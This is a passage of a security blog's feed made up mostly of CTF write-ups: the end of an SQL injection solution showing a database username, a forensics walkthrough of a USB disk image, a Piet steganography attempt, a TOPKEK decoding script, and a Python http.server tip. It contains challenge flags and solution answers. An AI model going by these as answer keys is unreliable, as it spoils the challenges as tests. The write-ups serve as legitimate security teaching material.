<p>So we got the flag: <code>ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}</code>.</p>
<p><strong>BONUS</strong>: I used my script to get the username:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT user()</div><div class="line">User: ecw@localhost</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:44:43.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
<p>Its content is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
<p>So we need to find Windows registry and browse it.</p>
<blockquote>
<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
</blockquote>
<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
<p><strong>Bonus</strong>:</p>
<ul>
<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Vote 2016 - 250 - Trump likes colors - Steganography</title>
    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/"/>
    <id>http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/</id>
    <published>2016-11-04T23:00:00.000Z</published>
    <updated>2016-11-05T17:33:07.876Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Hack The Vote 2016</li>
<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Somebody leAked TrumP’s favorite colors, looks like they used a really esoteric format. Some chiNese hacker named “DanGer Mouse” provided us the leak, getting this crucial info could really sway voters at the polls!</p>
<p><a href="https://s3.amazonaws.com/hackthevote/trump_likes_colors.bcddf8152cf2848c058310655c280a7dbb4f22fcc3687f00a26b6e9a57657dc4.png" target="_blank" rel="external">trump_likes_colors.png</a></p>
<p>author’s irc nick: nihliphobe</p>
</blockquote>
<p><strong>Note</strong>: This challenge was classified as <em>Forensics</em> but is <em>Steganography</em>.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR :</strong> this is a incomplete solving, we didn’t go until the end of this challenge.</p>
<p>The description is talking about <code>DanGer Mouse</code>, search for it, it looks like a website about esoteric languages and algorithms (<a href="http://www.dangermouse.net/esoteric/" target="_blank" rel="external">http://www.dangermouse.net/esoteric/</a>).</p>
<p>Look at the histogram of the image:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ convert trump_likes_colors.png histogram:- | identify -format %c -</div><div class="line">    249552: (  0,  0,  0) #000000 black</div><div class="line">         1: (  0,  0,192) #0000C0 srgb(0,0,192)</div><div class="line">       102: (  0,  0,255) #0000FF blue</div><div class="line">         1: (  0,192,  0) #00C000 srgb(0,192,0)</div><div class="line">         1: (  0,192,192) #00C0C0 srgb(0,192,192)</div><div class="line">        48: (  0,255,  0) #00FF00 lime</div><div class="line">        48: (  0,255,255) #00FFFF cyan</div><div class="line">         2: (192,  0,  0) #C00000 srgb(192,0,0)</div><div class="line">         1: (192,  0,192) #C000C0 srgb(192,0,192)</div><div class="line">         1: (192,192,  0) #C0C000 srgb(192,192,0)</div><div class="line">        83: (255,  0,  0) #FF0000 red</div><div class="line">       103: (255,  0,255) #FF00FF magenta</div><div class="line">        51: (255,255,  0) #FFFF00 yellow</div><div class="line">         6: (255,255,255) #FFFFFF white</div></pre></td></tr></table></figure>
<p>The colors used seem to be only the ones used in <a href="http://www.dangermouse.net/esoteric/piet.html" target="_blank" rel="external">PIET</a> language.</p>
<p>There is a programm implementing PIET: <code>npiet</code>, we used it to run the programm.</p>
<p><strong>N.B.:</strong> As we can see in the <a href="https://www.bertnase.de/npiet/picture.html" target="_blank" rel="external">gallery</a>. Vertical lines are an easy way to store a string, so our image must contain a string with the favorite color of Trump.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet trump_likes_colors.png</div><div class="line">#ff0000</div></pre></td></tr></table></figure>
<p>So the programm gave us the favorite color of Trump:<br><code>#ff0000</code> = Red = rgb(255, 0, 0) = hsl(0, 100%, 50%).</p>
<p>The description let us think that was that we were looking for but IRC moderators told us that was not the end.</p>
<p>So I checked the trace of the programm:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet -t trump_likes_colors.png</div><div class="line"></div><div class="line">trace: step 0  (0,0/r,l nR -&gt; 1,0/r,l dR):</div><div class="line">action: push, value 35</div><div class="line">trace: stack (1 values): 35</div><div class="line"></div><div class="line">trace: step 1  (1,0/r,l dR -&gt; 2,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">#</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 2  (2,0/r,l nM -&gt; 3,0/r,l dM):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 3  (3,0/r,l dM -&gt; 4,0/r,l nB):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 4  (4,0/r,l nB -&gt; 5,0/r,l dB):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 5  (5,0/r,l dB -&gt; 6,0/r,l nC):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 6  (6,0/r,l nC -&gt; 7,0/r,l dC):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 7  (7,0/r,l dC -&gt; 8,0/r,l nG):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 8  (8,0/r,l nG -&gt; 9,0/r,l dG):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 9  (9,0/r,l dG -&gt; 10,0/r,l nY):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 10  (10,0/r,l nY -&gt; 11,0/r,l dY):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 11  (11,0/r,l dY -&gt; 12,0/r,l nR):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 12  (12,0/r,l nR -&gt; 13,0/r,l dR):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 13  (13,0/r,l dR -&gt; 14,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line">trace: entering white block at 16,0 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 14  (14,0/r,l nM -&gt; 16,0/r,l WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: entering white block at 16,3 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 15  (16,0/r,l WW -&gt; 16,3/d,r WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: white cell(s) crossed - continuing with no command at 14,3...</div><div class="line"></div><div class="line">trace: step 16  (16,3/d,r WW -&gt; 14,3/l,l nY):</div></pre></td></tr></table></figure>
<p>Seems there is nothing interesting.</p>
<p>I also genererated the image trace:</p>
<p><img src="http://i.imgur.com/wOE90pQ.png" alt=""></p>
<p>That only show us that char as pushed one by one, and there is not loop or conditional statements.</p>
<p>So maybe there was something to do with the capital letters in the description?</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="stegano" scheme="http://rawsec.ml/tags/stegano/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Vote 2016 - 50 - TOPKEK - Misc</title>
    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/"/>
    <id>http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/</id>
    <published>2016-11-04T23:00:00.000Z</published>
    <updated>2016-11-05T17:33:07.876Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Hack The Vote 2016</li>
<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>A CNN reporter had only one question that she couldn’t get off her mind</p>
<blockquote>
<p>   Do we even know, who is this 4 CHAN???</p>
</blockquote>
<p>So she set out to find who this 400lb hacker is. During her investigation, she came across this cryptic message on some politically incorrect forum online, can you figure out what it means?</p>
<p><a href="https://s3.amazonaws.com/hackthevote/kek.43319559636b94db1c945834340b65d68f90b6ecbb70925f7b24f6efc5c2524e.txt" target="_blank" rel="external">kek</a></p>
<p>author’s irc nick: krx</p>
</blockquote>
<p><strong>Note</strong>: This challenge was classified as <em>Crypto</em> but is <em>Misc</em>.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The content of the file looks like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!!</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>This looks like an esoteric language (like Ook) but it’s not.</p>
<p><strong>N.B.:</strong> According to <a href="http://fr.urbandictionary.com/define.php?term=topkek" target="_blank" rel="external">1</a>, <a href="https://encyclopediadramatica.se/Topkek" target="_blank" rel="external">2</a> and <a href="http://knowyourmeme.com/memes/topkek" target="_blank" rel="external">3</a>, <em>kek</em> is derivated of <em>lel</em> that is a derivated of <em>lol</em>, and <em>topkek</em> is a cake trademark popular on <code>/s4s</code> chan of 4Chan because of its similarity with <em>toplel</em> which means <em>super funny</em>. (Knowing that is useless for the challenge).</p>
<p>There is only two keyword <code>TOP</code> and <code>KEK</code> and they seem pretty useless. So let’s assume that it is binary: (<code>TOP</code> = 0 &amp;&amp; <code>KEK</code> = 1) or (<code>TOP</code> = 1 &amp;&amp; <code>KEK</code> = 0).</p>
<p>We noticed there is between 1 and 5 exclamation marks following each keywords so let’s assume that is the number of times that 0 or 1 is repeated.</p>
<p>Here is my script:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="comment"># read the file</span></div><div class="line">file = File.open(<span class="string">'kek.txt'</span>, <span class="string">'r+t'</span>)</div><div class="line">data = file.read</div><div class="line">file.close</div><div class="line">puts <span class="string">"Original: \n"</span> + data + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Assume that TOP = 1, KEK = 0, and ! the number of time they appear</span></div><div class="line">topkek_to_binary = <span class="string">""</span></div><div class="line">data.split(<span class="string">" "</span>).each <span class="keyword">do</span> <span class="params">|bool|</span></div><div class="line">  <span class="keyword">if</span> bool.match(<span class="regexp">/TOP/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'TOP'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'1'</span>) <span class="comment"># replacing marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">elsif</span> bool.match(<span class="regexp">/KEK/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'KEK'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'0'</span>) <span class="comment"># replacing marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">puts <span class="string">"Binary: \n"</span> + topkek_to_binary + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Let's convert it into ASCII</span></div><div class="line">puts <span class="string">"ASCII: \n"</span> + [topkek_to_binary].pack(<span class="string">"B*"</span>)</div></pre></td></tr></table></figure>
<p>Here is the output of the script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Original:</div><div class="linediv><div class="line"></div><div class="line">Binary:</div><div class="linediv><div class="line"></div><div class="line">ASCII: +</div><div class="line">flag&#123;T0o0o0o0o0P______1m_h4V1nG_FuN_r1gHt_n0W_4R3_y0u_h4v1ng_fun______K3K!!!&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Python 3 &quot;No module named SimpleHTTPServer&quot;</title>
    <link href="http://rawsec.ml/en/python-3-simplehttpserver/"/>
    <id>http://rawsec.ml/en/python-3-simplehttpserver/</id>
    <published>2016-10-20T22:00:00.000Z</published>
    <updated>2016-10-22T21:57:52.156Z</updated>
    
    <content type="html"><![CDATA[<p>If the default <strong>python</strong> on your machine is python 3 so running the following command will result an error:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -m SimpleHTTPServer</div><div class="line">python: No module named SimpleHTTPServer</div></pre></td></tr></table></figure>
<p>So use instead:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m http.server</div></pre></td></tr></table></figure>
<p>The <a href="https://docs.python.org/2/library/simplehttpserver.html" target="_blank" rel="external">python 2.7 doc</a> warns:</p>
<blockquote>
<p><strong>Note :</strong> The <a href="https://docs.python.org/2/library/simplehttpserver.html#module-SimpleHTTPServer" target="_blank" rel="external"><code>SimpleHTTPServer</code></a> module has been merged into <code>http.server</code> in Python 3. The <a href="https://docs.python.org/2/glossary.html#term-2to3" target="_blank" rel="external">2to3</a> tool will automatically adapt imports when converting your sources to Python 3.</p>
</blockquote>
<p>You can also check the <a href="https://docs.python.org/3.5/library/http.server.html" target="_blank" rel="external">python 3.5 doc</a>.</p>
<p>Note that on some machines <code>python</code> redirects to <em>python 2</em> and on some others to <em>python 3</em>, so if you want a command that always works use <code>python3 -m http.server</code> or <code>python2 -m SimpleHTTPServer</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;If the default &lt;strong&gt;python&lt;/strong&gt; on your machine is python 3 so running the following command will result an error:&lt;/p&gt;
&lt;figure cla
    
    </summary>
    
      <category term="programming" scheme="http://rawsec.ml/categories/programming/"/>
    
      <category term="python" scheme="http://rawsec.ml/categories/programming/python/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
